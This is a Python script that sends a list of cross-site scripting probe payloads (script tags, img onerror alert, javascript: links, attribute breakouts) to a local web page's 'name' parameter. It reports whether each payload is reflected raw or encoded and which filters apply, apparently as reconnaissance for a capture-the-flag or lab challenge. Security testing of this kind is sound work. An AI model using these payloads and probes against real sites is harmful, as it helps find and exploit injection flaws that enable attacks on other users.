import requests
import re
import html
import urllib.parse

# Target endpoint
base_url = "http://127.0.0.1:33081/page"

# Test payloads
payloads = [
    "HelloTest",
    "<b>BOLD</b>",
    "<i>ITALIC</i>",
    "<script>test</script>",
    '<img src=x onerror=alert(1)>',
    '" onload=alert(1)>',
    '<a href="javascript:alert(1)">click</a>',
    "<>",  # Special chars
    '"',
    "'",
    "&",
    '<img src=x onError=alert(\'XSS\')>'  # Mixed with uppercase XSS
]

print("="*70)
print("XSS CONTEXT ANALYSIS - Testing payload reflection patterns")
print("="*70)

for payload in payloads:
    print(f"\n[+] Testing PAYLOAD: {payload}")
    
    try:
        # URL encode the payload for the GET parameter
        encoded_payload = urllib.parse.quote(payload, safe='')
        url = f"{base_url}?name={encoded_payload}"
        
        # Make GET request
        response = requests.get(url, timeout=10)
        response_text = response.text
        
        # Check if payload appears in response
        payload_escaped = html.escape(payload)
        if payload in response_text:
            reflection_found = "Yes"
            reflection_context = "RAW (unencoded)"
        elif payload_escaped in response_text:
            reflection_found = "Yes"
            reflection_context = "HTML Encoded"
        else:
            reflection_found = "No"
            reflection_context = "N/A"
        
        # Try to find the reflection location
        if reflection_found != "No":
            # Look for patterns around the reflection
            if payload in response_text:
                idx = response_text.find(payload)
            else:
                idx = response_text.find(payload_escaped)
            
            # Extract context (50 chars before and after)
            start = max(0, idx - 100)
            end = min(len(response_text), idx + len(payload) + 100)
            context_snippet = response_text[start:end]
            
            # Analyze context
            if "<script" in context_snippet and ">" in context_snippet:
                if payload in context_snippet:
                    context_type = "Inside SCRIPT tag (raw)"
                else:
                    context_type = "Inside SCRIPT tag (encoded)"
            elif "href=" in context_snippet or "src=" in context_snippet:
                if payload in context_snippet:
                    context_type = "Inside HTML attribute (raw)"
                else:
                    context_type = "Inside HTML attribute (encoded)"
            elif "<" in context_snippet and ">" in context_snippet:
                if payload in context_snippet:
                    context_type = "Inside HTML tag structure (raw)"
                else:
                    context_type = "Inside HTML tag structure (encoded)"
            else:
                context_type = "Plain text content"
        else:
            context_snippet = "N/A"
            context_type = "Payload not found"
        
        # Check for filters
        if reflection_found == "No":
            filter_status = "BLOCKED (completely removed)"
        elif payload != payload_escaped and payload_escaped in response_text:
            filter_status = "ENCODED (HTML entities applied)"
        elif "<script" in payload.lower() and "<script" not in response_text:
            filter_status = "BLOCKED (tags stripped/filtered)"
        elif "onerror" in payload.lower() and "onerror=" not in response_text:
            filter_status = "BLOCKED (event handlers removed)"
        elif payload in response_text:
            filter_status = "NONE (raw reflection)"
        else:
            filter_status = "PARTIAL (modified but present)"
        
        # Print results
        print(f"Response contains payload: {reflection_found}")
        print(f"Reflection context: {context_type}")
        print(f"Filter detected: {filter_status}")
        print(f"URL encoding: {'Applied' if encoded_payload != payload else 'Not needed'}")
        print(f"Response snippet:\n{context_snippet}\n")
        print("-"*70)
        
    except Exception as e:
        print(f"ERROR: {e}")
        print("-"*70)

